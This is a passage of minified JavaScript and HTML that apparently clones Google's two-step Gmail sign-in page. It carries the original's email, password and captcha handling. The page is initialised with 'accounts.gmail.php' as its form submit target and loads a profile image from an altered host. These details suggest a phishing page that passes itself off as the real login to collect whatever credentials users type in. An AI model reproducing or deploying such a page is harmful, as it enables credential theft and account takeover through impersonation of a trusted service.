var PS_Gd=function(a,b,c){a.c=c?PS_Z(b,!0):b;a.c&&(a.c=a.c.replace(/:$/,""))},PS_Hd=function(a,b){if(b){b=Number(b);if(isNaN(b)||0>b)throw Error("Bad port number "+b);a.i=b}else a.i=null},PS_Id=function(a,b,c){b instanceof PS_Y?(a.f=b,PS_Pd(a.f,a.a)):(c||(b=PS_Kd(b,PS_Qd)),a.f=new PS_Y(b,0,a.a))},PS_Jd=function(a,b,c){a.g=c?PS_Z(b):b;return a},PS_Z=function(a,b){return a?b?decodeURI(a.replace(/%25/g,"%2525")):decodeURIComponent(a):""},PS_Kd=function(a,b,c){return PS_f(a)?(a=encodeURI(a).replace(b,
PS_Rd),c&&(a=a.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),a):null},PS_Rd=function(a){a=a.charCodeAt(0);return"%"+(a>>4&15).toString(16)+(a&15).toString(16)},PS_Ld=/[#\/\?@]/g,PS_Nd=/[\#\?:]/g,PS_Md=/[\#\?]/g,PS_Qd=/[\#\?@]/g,PS_Od=/#/g,PS_Y=function(a,b,c){this.c=this.a=null;this.b=a||null;this.f=!!c},PS__=function(a){a.a||(a.a=new PS_O,a.c=0,a.b&&PS_5c(a.b,function(b,c){b=PS_ua(b);PS__(a);a.b=null;b=PS_0(a,b);var d=a.a.get(b);d||a.a.set(b,d=[]);d.push(c);a.c=PS_Ja(a.c)+1}))},PS_Sd=function(a,b){PS__(a);
b=PS_0(a,b);PS_P(a.a.c,b)&&(a.b=null,a.c=PS_Ja(a.c)-a.a.get(b).length,a=a.a,PS_P(a.c,b)&&(delete a.c[b],a.b--,a.f++,a.a.length>2*a.b&&PS_Jc(a)))},PS_Td=function(a,b){PS__(a);b=PS_0(a,b);return PS_P(a.a.c,b)};PS_Y.prototype.I=function(){PS__(this);for(var a=this.a.C(),b=this.a.I(),c=[],d=0;d<b.length;d++)for(var e=a[d],f=0;f<e.length;f++)c.push(b[d]);return c};
PS_Y.prototype.C=function(a){PS__(this);var b=[];if(PS_f(a))PS_Td(this,a)&&(b=PS_Ua(b,this.a.get(PS_0(this,a))));else{a=this.a.C();for(var c=0;c<a.length;c++)b=PS_Ua(b,a[c])}return b};PS_Y.prototype.set=function(a,b){PS__(this);this.b=null;a=PS_0(this,a);PS_Td(this,a)&&(this.c=PS_Ja(this.c)-this.a.get(a).length);this.a.set(a,[b]);this.c=PS_Ja(this.c)+1;return this};PS_Y.prototype.get=function(a,b){a=a?this.C(a):[];return 0<a.length?String(a[0]):b};
PS_Y.prototype.toString=function(){if(this.b)return this.b;if(!this.a)return"";for(var a=[],b=this.a.I(),c=0;c<b.length;c++)for(var d=b[c],e=encodeURIComponent(String(d)),d=this.C(d),f=0;f<d.length;f++){var g=e;""!==d[f]&&(g+="="+encodeURIComponent(String(d[f])));a.push(g)}return this.b=a.join("&")};
var PS_0=function(a,b){b=String(b);a.f&&(b=b.toLowerCase());return b},PS_Pd=function(a,b){b&&!a.f&&(PS__(a),a.b=null,a.a.forEach(function(a,b){var c=b.toLowerCase();b!=c&&(PS_Sd(this,b),PS_Sd(this,c),0<a.length&&(this.b=null,this.a.set(PS_0(this,c),PS_Va(a)),this.c=PS_Ja(this.c)+a.length))},a));a.f=b};var PS_Ud=function(){return!(PS_("iPad")||PS_("Android")&&!PS_("Mobile")||PS_("Silk"))&&(PS_("iPod")||PS_("iPhone")||PS_("Android")||PS_("IEMobile"))};var PS_Vd=function(a,b){a=[a];for(var c=b.length-1;0<=c;--c)a.push(typeof b[c],b[c]);return a.join("\x0B")};var PS_Wd=function(){PS_u.call(this,"navigate")};PS_i(PS_Wd,PS_u);var PS_4=function(a,b,c,d){PS_x.call(this);if(a&&!b)throw Error("Can't use invisible history without providing a blank page.");var e;if(c)e=c;else{e="history_state"+PS_Xd;var f=PS_sc("input",{type:"text",name:e,id:e,style:PS_bc("display:none")});document.write(PS_H(f));e=PS_J(document,e)}this.o=e;c=c?(c=PS_Ec(c))?c.parentWindow||c.defaultView:window:window;this.a=c;this.s=b;PS_p&&!b&&(this.s="https"==window.location.protocol?PS_hc(PS_ac(PS_bc("###///"))):PS_hc(PS_ac(PS_bc('javascript:""'))));this.f=
new PS_z(150);PS_m(this,this.f);this.h=!a;this.g=new PS_R(this);if(a||PS_1){var g;if(d)g=d;else{a="history_iframe"+PS_Xd;c=this.s;b={id:a,style:PS_bc("display:none"),sandbox:void 0};c&&PS_gc(c);d={};d.src=c||null;d.srcdoc=null;c={sandbox:""};e={};for(g in d)PS_j(g.toLowerCase()==g,"Must be lower case"),e[g]=d[g];for(g in c)PS_j(g.toLowerCase()==g,"Must be lower case"),e[g]=c[g];for(g in b){f=g.toLowerCase();if(f in d)throw Error('Cannot override "'+f+'" attribute, got "'+g+'" with value "'+b[g]+'"');
f in c&&delete e[f];e[g]=b[g]}g=PS_rc("iframe",e,void 0);document.write(PS_H(g));g=PS_J(document,a)}this.u=g;this.G=!0}PS_1&&(PS_S(this.g,this.a,"load",this.H),this.F=this.v=!1);this.h?PS_Yd(this,PS_2(this),!0):PS_3(this,this.o.value);PS_Xd++};PS_i(PS_4,PS_x);PS_4.prototype.m=!1;PS_4.prototype.l=!1;PS_4.prototype.i=null;
var PS_Zd=function(a,b){var c=b||PS_Vd;return function(){var b=this||PS_b,b=b.closure_memoize_cache_||(b.closure_memoize_cache_={}),e=c(a[PS_ma]||(a[PS_ma]=++PS_na),arguments);return b.hasOwnProperty(e)?b[e]:b[e]=a.apply(this,arguments)}}(function(){return PS_p?8<=Number(PS_t):"onhashchange"in PS_b}),PS_1=PS_p&&!(8<=Number(PS_t));PS_4.prototype.j=null;PS_4.prototype.c=function(){PS_4.N.c.call(this);this.g.Y();PS__d(this,!1)};
var PS__d=function(a,b){if(b!=a.m)if(PS_1&&!a.v)a.F=b;else if(b)if(PS_o?PS_S(a.g,a.a.document,PS_0d,a.O):PS_q&&PS_S(a.g,a.a,"pageshow",a.L),PS_Zd()&&a.h)PS_S(a.g,a.a,"hashchange",a.K),a.m=!0,PS_y(a,new PS_Wd(PS_2(a)));else{if(!PS_p||PS_Ud()||a.v)PS_S(a.g,a.f,"tick",PS_g(a.w,a,!0)),a.m=!0,PS_1||(a.i=PS_2(a),PS_y(a,new PS_Wd(PS_2(a)))),a.f.start()}else a.m=!1,PS_Nc(a.g),PS_Ub(a.f)};PS_4.prototype.H=function(){this.v=!0;this.o.value&&PS_3(this,this.o.value,!0);PS__d(this,this.F)};
PS_4.prototype.L=function(a){a.P.persisted&&(PS__d(this,!1),PS__d(this,!0))};PS_4.prototype.K=function(){var a=PS_1d(this.a);a!=this.i&&PS_2d(this,a)};
var PS_2=function(a){return null!=a.j?a.j:a.h?PS_1d(a.a):PS_3d(a)||""},PS_1d=function(a){a=a.location.href;var b=a.indexOf("#");return 0>b?"":a.substring(b+1)},PS_4d=function(a,b,c){PS_2(a)!=b&&(a.h?(PS_Yd(a,b,c),PS_Zd()||PS_p&&!PS_Ud()&&PS_3(a,b,c,void 0),a.m&&a.w()):(PS_3(a,b,c),a.j=a.i=a.o.value=b,PS_y(a,new PS_Wd)))},PS_Yd=function(a,b,c){a=a.a.location;var d=a.href.split("#")[0],e=-1!=a.href.indexOf("#");if(PS_1||e||b)d+="#"+b;d!=a.href&&(c?a.replace(d):a.href=d)},PS_3=function(a,b,c,d){if(a.G||
b!=PS_3d(a))if(a.G=!1,b=encodeURIComponent(String(b)),PS_p){var e=PS_Fc(a.u);e.open("text/html",c?"replace":void 0);c=PS_tc(PS_sc("title",{},d||a.a.document.title),PS_sc("body",{},b));e.write(PS_H(c));e.close()}else if(PS_Na(a.s,PS_E,"this.iframeSrc_ must be set on calls to setIframeToken_"),e=PS_gc(a.s)+"#"+b,a=a.u.contentWindow)c?a.location.replace(e):a.location.href=e},PS_3d=function(a){if(PS_p)return a=PS_Fc(a.u),a.body?PS_ua(a.body.innerHTML):null;var b=a.u.contentWindow;if(b){var c;try{c=PS_ua(PS_1d(b))}catch(d){return a.l||
(1!=a.l&&PS_Vb(a.f,1E4),a.l=!0),null}a.l&&(0!=a.l&&PS_Vb(a.f,150),a.l=!1);return c||null}return null};PS_4.prototype.w=function(){if(this.h){var a=PS_1d(this.a);a!=this.i&&PS_2d(this,a)}if(!this.h||PS_1)if(a=PS_3d(this)||"",null==this.j||a==this.j)this.j=null,a!=this.i&&PS_2d(this,a)};var PS_2d=function(a,b){a.i=a.o.value=b;a.h?(PS_1&&PS_3(a,b),PS_Yd(a,b)):PS_3(a,b);PS_y(a,new PS_Wd(PS_2(a)))};PS_4.prototype.O=function(){PS_Ub(this.f);this.f.start()};
var PS_0d=["mousedown","keydown","mousemove"],PS_Xd=0;var PS_5d=function(a,b){PS_l.call(this);this.b=a;this.f=null;this.a=new PS_4;PS_m(this,this.a);PS__d(this.a,!0);PS_4d(this.a,a,!0);this.h=b||PS_ia;a=new PS_R(this);PS_m(this,a);PS_S(a,this.a,"navigate",this.g)};PS_i(PS_5d,PS_l);var PS_6d={Da:"identifier",Ea:"password"},PS_5=function(a){return"identifier"==a.b};PS_5d.prototype.g=function(a){var b=PS_2(this.a),c;a:{for(c in PS_6d)if(PS_6d[c]==b){c=!0;break a}c=!1}c&&b!=this.b?(this.f=this.b,this.b=b,this.h(a)):PS_4d(this.a,this.b,!1)};var PS_7d=function(a){PS_l.call(this);this.m=a;this.j=PS_K("Email");this.o=PS_K("Passwd");this.a=PS_K("Email-hidden");this.g=this.a.value;this.b=PS_K("Passwd-hidden");this.h=PS_K("identifier-shown");this.v=PS_La(PS_Dc(this.h),"No children found under the element with id: identifier-shown");this.i=PS_K("password-shown");this.w=PS_La(PS_Dc(this.i),"No children found under the element with id: password-shown");this.l="";this.f=new PS_R(this);PS_m(this,this.f);PS_Bc(PS_5(this.m)?this.i:this.h);PS_Ac(this.a,
{name:"Email"});PS_S(this.f,this.j,"input",this.s);PS_S(this.f,this.a,"change",this.D)};PS_i(PS_7d,PS_l);PS_7d.prototype.s=function(){this.b.value&&(PS_Mc(this.f,this.j,"input",this.s),this.l=this.b.value)};PS_7d.prototype.D=function(){this.a.value=this.g};var PS_7=function(a,b,c){PS_l.call(this);this.f=new PS_5d(1==a?"password":"identifier",PS_g(this.Ca,this));PS_m(this,this.f);this.ua=PS_M("main-content");this.s=PS_K("gaia_loginform");this.o=PS_M("slide-out");this.j=PS_M("slide-in");this.b=PS_K("Email");this.l=PS_K("Passwd");this.u=PS_K("next");this.ka=PS_K("signIn");this.w=PS_K("back-arrow");this.v=PS_M("circle-mask");this.sa=PS_K("email-display");this.O=PS_K("profile-name");this.ta=PS_K("link-forgot-passwd");this.g=null;this.a=PS_K("canvas");this.ca=
PS_K("identifier-captcha");this.ea=PS_K("captcha-box");this.D=PS_K("captcha-img");this.da=PS_K("identifier-token");this.m=PS_K("identifier-captcha-input");this.i=null;this.Ba=PS_K("profile-information");this.ja=PS_J(document,"session-state");this.la=PS_M("signin-card");this.F=PS_M("card-mask-wrap");this.G=PS_J(document,"dasher-tooltip");this.K=new PS_A(this.qa,75,this);PS_m(this,this.K);this.L=this.U=!1;this.H=0;this.h=new PS_R(this);PS_m(this,this.h);PS_S(this.h,this.s,"submit",this.ga);PS_Pa(["transitionend",
"webkitTransitionEnd","otransitionend","mozTransitionEnd"],function(a){PS_S(this.h,this.o,a,this.wa);PS_S(this.h,this.j,a,this.ya)},this);PS_Pc(this.w,this.va,this,this.h);this.s.action=b;this.V=new PS_7d(this.f);PS_m(this,this.V);0==a?PS_6(this.b):(PS_6(this.l),PS__b(this.w,"shift-form"));c&&!this.u.disabled&&this.ga()};PS_i(PS_7,PS_l);var PS_8d=["gaia","pages","PasswordSeparationPage"],PS_8=PS_b;PS_8d[0]in PS_8||!PS_8.execScript||PS_8.execScript("var "+PS_8d[0]);
for(var PS_9;PS_8d.length&&(PS_9=PS_8d.shift());)!PS_8d.length&&PS_c(PS_7)?PS_8[PS_9]=PS_7:PS_8[PS_9]&&Object.prototype.hasOwnProperty.call(PS_8,PS_9)?PS_8=PS_8[PS_9]:PS_8=PS_8[PS_9]={};var PS_9d={"-moz-transform":!0,"-ms-transform":!0,"-o-transform":!0,"-webkit-transform":!0,transform:!0};
PS_7.prototype.ga=function(a){PS_5(this.f)?(a&&a.preventDefault instanceof Function&&a.preventDefault(),PS_Q(this.u,!0),PS_Q(this.b,!0),PS_$d(this)):(PS_Q(this.ka,!0),PS_Q(this.u,!0),this.l.setAttribute("readonly",""))};PS_7.prototype.va=function(a){a.preventDefault();PS_4d(this.f.a,"identifier",!1)};
var PS_$d=function(a){if(!a.U){a.U=!0;var b={};b.Email=a.b.value;b.requestlocation=PS_b.location.href;a.L&&(b["identifier-captcha-input"]=a.m.value,b.identifiertoken=a.da.value);var c="js_disabled";try{document.bg.invoke(function(a){c=a})}catch(f){c=""}b.bgresponse=c;PS_ae(a,b);var d=[],e;for(e in b)d.push(e+"="+encodeURIComponent(b[e]));PS_Cb(PS_hd(PS_g(a.xa,a),d.join("&")),"timeout",function(){PS_$(this);PS_be(this,"timeoutError")},!1,a)}},PS_ae=function(a,b){a=PS_L("INPUT","",a.s);for(var c=0,
d;d=a[c];c++)"hidden"==d.type&&d.value&&!b[d.name]&&(b[d.name]=d.value)},PS_de=function(a,b){PS_ce(a);a.fa=b.name;a.za=b.email;a.ha=b.photo_url;a.ia=b.recovery_url;if(b.shadow_email){a.V.u=b.shadow_email;var c=PS_N("INPUT");c.setAttribute("type","hidden");c.setAttribute("name","ignoreShadow");c.setAttribute("value","1");a.s.appendChild(c)}a.Ba.value=b.encoded_profile_information;a.ja&&b.session_state&&(a.ja.value=b.session_state);PS_4d(a.f.a,"password",!1)};
PS_7.prototype.xa=function(a){this.U=!1;var b=PS_pd(a.target);if(200==b){var c;a=a.target;try{c=a.a?a.a.responseText:""}catch(e){PS_T(a.B,"Can not get responseText: "+e.message),c=""}c=PS_Rc(c);c.should_redirect_in_browser_drivefs&&window.external&&"systemBrowserAuth"in window.external&&window.external.systemBrowserAuth(c.email);if("SHOW_ERROR"==c.action)PS_$(this),PS_be(this,c.error_msg);else if("REDIRECT"==c.action){a=c.redirectUrl;c=PS_b.location;if("undefined"!=typeof Location&&"undefined"!=typeof Element){var b=
c&&(c instanceof Location||!(c instanceof Element)),d;d=PS_la(c)?c.constructor.displayName||c.constructor.name||Object.prototype.toString.call(c):void 0===c?"undefined":null===c?"null":typeof c;PS_j(b,"Argument is not a Location (or a non-Element mock); got: %s",d)}a=a instanceof PS_F?a:PS_mc(a);c.href=PS_jc(a)}else"SHOW_CAPTCHA"==c.action?(PS_$(this),PS_ee(this,c),PS_fe(this)):"SHOW_CAPTCHA_AND_ERROR"==c.action?(PS_$(this),PS_ee(this,c),PS_be(this,c.error_msg)):(PS_$(this),PS_de(this,c))}else 0<
b&&(PS_$(this),PS_de(this,{name:"",email:this.b.value,photo_url:"",recovery_url:"#/signin/recovery?Email="+this.b.value,encoded_profile_information:""}))};var PS_$=function(a){PS_Q(a.u,!1);PS_Q(a.b,!1)};
PS_7.prototype.Ca=function(){PS_Xb(this.K);var a=this.V;PS_5(a.m)?(PS_Bc(a.i),a.g=a.a.value="",a.o.value="",a.h.appendChild(a.v),a.l=a.b.value):(a.u?a.g=a.a.value=a.u:a.g=a.a.value=a.j.value,a.l!==a.b.value&&(a.o.value=a.b.value),PS_Bc(a.h),a.i.appendChild(a.w));if(PS_5(this.f)){if(PS_B(this.o,"hide-form",!1),PS_ge(this),PS_he(this,100,0),PS_ie(this,"shift-form",!1),PS_0b(this.w,"shift-form"),"password"==this.f.f&&(PS_xd(this.v,"0.01"),this.K.start(),PS_ce(this),PS_fe(this),PS_Q(this.ka,!1),PS_Q(this.u,
!1),this.l.removeAttribute("readonly"),a=this.s.ignoreShadow))if(PS_ja(a))for(var b=a.length,c=0;c<b;c++)a[c].value="0";else a.value="0"}else this.G&&PS_X(this.G,!1),PS_B(this.j,"hide-form",!1),PS_ge(this),PS_he(this,0,100),PS_ie(this,"shift-form",!0),PS_je(this)};
var PS_je=function(a){var b="###//lh3.mywebusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=96";a.ha&&(b=a.ha+"?sz="+String(a.a.width));(new PS_w(function(){this.g=PS_N("IMG");this.g.src=b;this.a.getContext("2d").clearRect(0,0,this.a.width,this.a.height);this.fa?(PS_Gc(this.O,this.fa),PS_X(this.O,!0),PS_ie(this,"no-name",!1)):(PS_X(this.O,!1),PS_ie(this,"no-name",!0));PS_Gc(this.sa,this.za||"");this.ia&&(this.ta.href=this.ia)},window,a)).start()},PS_ie=function(a,
b,c){PS_B(a.la,b,c);PS_ke(a,b,c)},PS_ke=function(a,b,c){PS_B(a.F,b,c);PS_B(a.ua,b,c)},PS_he=function(a,b,c){PS_W(a.o,"transitionDelay",b+"ms");PS_W(a.j,"transitionDelay",c+"ms")},PS_ge=function(a){a.la.offsetWidth},PS_be=function(a,b){PS_6(a.b);var c=PS_K("errormsg_0_Email"),d;if("INGE"==b){d=PS_K("inge").cloneNode(!0);var e=PS_Dc(d),f;f=new PS_Fd(e.href);var g=new PS_Y(f.g);g.set("EmailAddress",PS_Ca(a.b.value));f=PS_Jd(f,PS_Z(g.toString())).toString();e.href=f}else"timeoutError"==b&&(d=PS_K("timeoutError").cloneNode(!0));
d?((b=c.parentNode)&&b.replaceChild(d,c),PS_Ac(d,{id:"errormsg_0_Email"}),PS_X(d,!0)):PS_Gc(c,b+" ");c=a.H;d=PS_K("errormsg_0_Email");b=d.cloneNode(!0);PS_0b(b,"error-msg");a:{if(PS_wc&&!(PS_p&&PS_s("9")&&!PS_s("10")&&PS_b.SVGElement&&d instanceof PS_b.SVGElement)&&(e=d.parentElement))break a;e=d.parentNode;e=PS_la(e)&&1==e.nodeType?e:null}e.appendChild(b);if("none"!=PS_vd(b,"display"))e=PS_wd(b);else{e=b.style;f=e.display;var g=e.visibility,h=e.position;e.visibility="hidden";e.position="absolute";
e.display="inline";var k=PS_wd(b);e.display=f;e.position=h;e.visibility=g;e=k}e=e.height;PS_Cc(b);PS_p?(b=PS_yd(d,"marginLeft"),f=PS_yd(d,"marginRight"),g=PS_yd(d,"marginTop"),d=PS_yd(d,"marginBottom"),d=new PS_rd(g,f,d,b)):(b=PS_ud(d,"marginLeft"),f=PS_ud(d,"marginRight"),g=PS_ud(d,"marginTop"),d=PS_ud(d,"marginBottom"),d=new PS_rd(parseFloat(g),parseFloat(f),parseFloat(d),parseFloat(b)));e+=d.top+d.bottom;a.H=e;d=a.F;b:{b=PS_Fa("transform");if(void 0===d.style[b]&&(b=PS_qd()+PS_Ga(b),void 0!==d.style[b])){b=
(PS_r?"-webkit":PS_q?"-moz":PS_p?"-ms":PS_o?"-o":null)+"-transform";break b}b="transform"}d=(d=PS_vd(d,b)||PS_vd(d,"transform"))?(d=d.match(PS_zd))?new PS_uc(parseFloat(d[1]),parseFloat(d[2])):new PS_uc(0,0):new PS_uc(0,0);d=d.Z+(a.H-c);0>d&&(c=a.F,PS_Cd()&&(d=PS_Dd()?"translate3d(0px,"+d+"px,0px)":"translate(0px,"+d+"px)",PS_W(c,PS_Ed(),d)));PS_ie(a,"has-error",!0);PS__b(a.b,"form-error")},PS_fe=function(a){a.H=0;PS_W(a.F,"transform","");PS_Gc(PS_K("errormsg_0_Email"),"");PS_Cc(PS_J(document,"errormsg_0_Passwd"));
PS_ie(a,"has-error",!1);PS_0b(a.b,"form-error");PS_0b(a.l,"form-error")};PS_7.prototype.qa=function(){PS_W(this.v,"background-image","");PS_xd(this.v,"")};
PS_7.prototype.ma=function(){var a=this.a.width/2-this.g.width/2,b=this.a.height/2-this.g.height/2,c=this.a.getContext("2d"),d=0,e=this.a.width/2,f=this.a.height/2,g=PS_N("canvas");g.width=this.a.width;g.height=this.a.height;var h=g.getContext("2d"),k=this.a.width/12,l=PS_g(function(){c.save();window.chrome?(h.clearRect(0,0,g.width,g.height),h.globalCompositeOperation="source-over",h.drawImage(this.g,a,b),h.shadowColor="#fff",h.globalCompositeOperation="destination-in",h.beginPath(),h.arc(e,f,d,0,
2*Math.PI,!1),h.closePath(),h.fill(),c.drawImage(g,0,0)):c.drawImage(this.g,a,b);c.restore()},this),m=PS_g(function(){var a=new PS_w(m);d+=k;if(d<=this.a.width){var b=d;c.save();window.chrome||(c.beginPath(),c.arc(e,f,b,0,2*Math.PI,!1),c.clip());l();c.restore();a.start()}else PS_Pb(a),PS_5(this.f)||PS_W(this.v,"background-image","none")},this);m()};
var PS_ee=function(a,b){PS_ke(a,"has-captcha",!0);a.L=!0;var c=b.img_url,d=PS_L("IMG","",a.D)[0];d?d.setAttribute("src",c):(d=PS_N("IMG"),d.setAttribute("src",c),d.setAttribute("alt",PS_8b(a.D)),a.D.appendChild(d));b.audio_url&&(c=b.audio_url,a.i=PS_L("A","",a.ea)[0],a.i?PS_Mc(a.h,a.i,"click"):(a.i=PS_N("A"),PS_L("SPAN","",a.ea)[0].appendChild(a.i)),PS_S(a.h,a.i,"click",PS_qa(a.Aa,c)),d=PS_L("IMG","",a.i)[0],d||(d=PS_N("IMG"),d.setAttribute("src","accessibility.gif"),PS__b(d,"accessibility-logo"),
a.i.appendChild(d)),d.setAttribute("alt",c));a.da.setAttribute("value",PS_Ca(b.captcha_token));a.m.value="";PS_X(a.ca,!0)};
PS_7.prototype.Aa=function(a){var b=PS_N("AUDIO");b.canPlayType&&b.canPlayType("audio/x-wav")?b.setAttribute("autoplay","autoplay"):(b=PS_N("EMBED"),b.setAttribute("hidden","true"),b.setAttribute("autostart","true"));b.setAttribute("src",a);a=PS_K("playIdentifierAudio");if(PS_xc[a.tagName.toUpperCase()])throw Error("goog.dom.safe.setInnerHtml cannot be used to set content of "+a.tagName+".");a.innerHTML=PS_H(b);this.m.value="";PS_6(this.m)};
var PS_ce=function(a){PS_ke(a,"has-captcha",!1);PS_Cc(PS_yc("captcha-container",a.j));a.L=!1;PS_Bc(a.D);a.m.value="";PS_X(a.ca,!1)},PS_6=function(a){!a||"function"!=typeof a.focus||PS_9a()||PS_("iPad")||PS_("iPod")||PS_("Trident")||PS_("MSIE")||a.focus()};PS_7.prototype.wa=function(a){a.target==this.o&&PS_9d[a.P.propertyName]&&(PS_5(this.f)?(this.G&&PS_X(this.G,!0),PS_6(this.b)):(PS_fe(this),PS__b(this.w,"shift-form"),PS_B(this.o,"hide-form",!0),PS_ge(this),PS_ge(this)))};
PS_7.prototype.ya=function(a){a.target==this.j&&PS_9d[a.P.propertyName]&&(PS_5(this.f)?(PS_B(this.j,"hide-form",!0),PS_ge(this)):(this.g.complete?this.ma.call(this):PS_Lc(this.h,this.g,"load",this.ma,void 0),PS_6(this.l)))};
		</script>
		<script>
			passwordSeparationPage = new gaia.pages.PasswordSeparationPage(0, 'accounts.gmail.php', gaia.ps.hasPrefilledIdentifier);
		</script>
		<input type="text" name="history_state0" id="history_state0" style="display:none">
		<script>
			(function() {
				gaia_onLoginSubmit = function() {
					try {
						gaia.loginAutoRedirect.stop();
					} catch (err) {
						// do not prevent form from being submitted
					}
					try {
						document.bg.invoke(function(response) {
							document.getElementById('bgresponse').value = response;
						});
					} catch (err) {
						document.getElementById('bgresponse').value = '';
					}
					return true;
				}
				document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
				var signinButton;
				signinButton = document.getElementById('next');
				gaia_attachEvent(window, 'load', function() {
					gaia_scrollToElement(signinButton);
				});
			})();
		</script>
		<script>
			var e = this,
			    g = function(a, c) {
				a = a.split(".");
				var b = e;
				a[0] in b || !b.execScript || b.execScript("var " + a[0]);
				for (var d; a.length && ( d = a.shift()); )
					a.length ||
					void 0 === c ? b[d] ? b = b[d] : b = b[d] = {} : b[d] = c
			};
			var h = function() {
				try {
					return new XMLHttpRequest
				} catch(b) {
					for (var a = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"],
					    c = 0; c < a.length; c++)
						try {
							return new ActiveXObject(a[c])
						} catch(d) {
						}
				}
				return null
			};
			g("gaia.ajax.newXmlHttpRequest", h);
			var k = function() {
				this.a = h();
				this.parameters = {}
			};
			g("gaia.ajax.XmlHttpFormRequest", k);
			k.prototype.send = function(a, c) {
				var b = [],
				    d;
				for (d in this.parameters)
				b.push(d + "=" + encodeURIComponent(this.parameters[d]));
				var b = b.join("&"),
				    f = this.a;
				f.open("POST", a, !0);
				f.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				f.onreadystatechange = function() {
					4 == f.readyState && c({
						status : f.status,
						text : f.responseText
					})
				};
				f.send(b)
			};
			k.prototype.send = k.prototype.send;
			k.prototype.h = function(a, c, b) {
				var d = this.a;
				d.open("POST", a, !0);
				d.setRequestHeader("Content-type", "application/json");
				d.onreadystatechange = function() {
					4 == d.readyState && b({
						status : d.status,
						text : d.responseText
					})
				};
				d.send(c)
			};
			k.prototype.sendJson = k.prototype.h;
			k.prototype.get = function(a, c) {
				var b = this.a;
				b.open("GET", a, !0);
				b.onreadystatechange = function() {
					4 == b.readyState && c({
						status : b.status,
						text : b.responseText
					})
				};
				b.send()
			};
			k.prototype.get = k.prototype.get;
			var l = /\s*;\s*/,
			    m = function() {
				if (!document.cookie)
					return "";
				for (var a = document.cookie.split(l),
				    c = 0; c < a.length; c++) {
					var b = a[c],
					    b = b.replace(/^\s+/, ""),
					    b = b.replace(/\s+$/, "");
					if (0 == b.indexOf("APISID="))
						return b.substr(7)
				}
				return ""
			};
			var n = null,
			    p = function(a, c) {
				this.g = a;
				this.f = c;
				this.c = m();
				this.b = !1
			},
			    q = function() {
				var a = n,
				    c = m();
				c == a.c || a.b || (a.c = c, (new k).get(a.f, function(b) {
					var a = n;
					b && b.status && 200 == b.status && "OK" == b.text && (a.a && clearInterval(a.a), a.b || (window.location = a.g))
				}))
			};
			p.prototype.start = function(a) {
				if (this.a)
					return !1;
				this.a = setInterval(function() {
					q()
				}, a);
				return !0
			};
			g("gaia.loginAutoRedirect.start", function(a, c, b) {
				if (n || !b || !c || 0 >= a)
					return !1;
				n = new p(c, b);
				return n.start(a)
			});
			g("gaia.loginAutoRedirect.stop", function() {
				var a = n;
				a.b = !0;
				a.a && (clearInterval(a.a), a.a = null)
			});
		</script>
		<script type="text/javascript">
			gaia.loginAutoRedirect.start(5000, '', '');
		</script>

	</body>
</html>